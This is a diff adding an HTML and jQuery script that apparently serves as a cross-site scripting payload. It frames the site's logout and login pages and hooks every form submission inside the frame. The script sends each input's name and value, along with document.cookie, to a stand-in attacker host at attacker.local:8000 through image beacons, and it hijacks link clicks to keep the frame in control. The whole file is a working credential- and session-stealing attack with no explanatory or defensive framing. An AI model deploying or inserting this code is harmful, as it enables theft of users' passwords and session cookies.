@@ -1,0 +1,42 @@
+<iframe id="bad_frame" src="/logout.php" style="width: 100%; height: 100vh; border-color: red; border-style: dashed; border-width: thick; position: absolute; top: 10px; left: 0">
+</iframe>
+<script>
+    let has_hook = false;
+    function goTo(url) {
+        history.pushState(null, '', url);
+        $('#bad_frame').attr('src', url);
+    }
+
+    function exfiltrate(data) {
+        const image = new Image();
+        image.src = 'http://attacker.local:8000/form?' + data;
+    }
+
+    $(document).ready(function () {
+        $("#bad_frame").on("load", function () {
+
+            exfiltrate('load-frame');
+            exfiltrate(document.cookie);
+
+            if(!has_hook){
+                goTo('/?page=login');
+                has_hook = true;
+            }
+            $(this).contents().find("form").submit(function () {
+                exfiltrate("Intercept-form");
+                $(this).find('input').each(function () {
+
+                    exfiltrate($(this).attr('name') + '=' + $(this).val());
+
+                    console.log("find value", $(this).attr('name'), $(this).val());
+                })
+            });
+
+            $(this).contents().find("a").click(function (e) {
+                e.preventDefault();
+                const link = $(this).attr('href');
+                goTo(link);
+            });
+        });
+    });
+</script>
